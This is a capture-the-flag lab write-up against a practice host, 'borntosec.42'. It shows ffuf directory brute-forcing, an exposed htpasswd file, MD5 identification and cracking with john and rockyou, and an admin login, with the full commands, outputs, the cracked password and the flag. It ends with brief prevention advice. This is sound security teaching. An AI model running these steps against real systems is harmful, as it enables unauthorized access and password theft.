# Bruteforcing directories
- a method used to uncover potentially sensitive or unsecured content by guessing paths that might exist on the server
- involves systematically trying different directory and file names on a web server to discover hidden or unlisted resources
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web

<b>keywords</b>: admin (htpasswd)<br>
<b>attacked site</b>: http://borntosec.42/

## Exploit
First, we add the site IP address to the known hosts:
``` shell
└─$ sudo nano /etc/hosts
192.168.56.106  borntosec.42
```
Now we run the <code>ffuf</code> tool to discover any subdirectories on the site:
``` shell
└─$ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://borntosec.42/FUZZ -mc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://borntosec.42/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 301
________________________________________________

admin                   [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 17ms]
css                     [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 6ms]
errors                  [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 9ms]
images                  [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 3ms]
includes                [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 5ms]
js                      [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 16ms]
whatever                [Status: 301, Size: 193, Words: 7, Lines: 8, Duration: 6ms]
:: Progress: [951/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
Accessing the <code>/whatever</code> subdirectory, we find a file that we can download:
``` shell
└─$ cat htpasswd           
root:437394baff5aa33daa618be47b75cb49
```
This file likely contains login credentials for the <code>/admin</code> subdirectory. We use <code>hash-identifier</code> to determine the hashing algorithm used:
``` shell
└─$ hash-identifier                  
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 437394baff5aa33daa618be47b75cb49

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
With this knowledge, we crack the password using <code>john</code>:
``` shell
└─$ john htpasswd_hash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty123@       (?)     
1g 0:00:00:00 DONE (2024-08-07 20:14) 1.886g/s 8375Kp/s 8375Kc/s 8375KC/s qwerty666666..qwertsss111
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
We then navigate to <code>http://borntosec.42/admin/</code> and log in with 'root' and 'qwerty123@'. This displays the flag:
```
The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## Flag
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

## Exploit prevention
- do not store sensitive data in accessible files
- ensure that sensitive directories are protected (authentication mechanism)
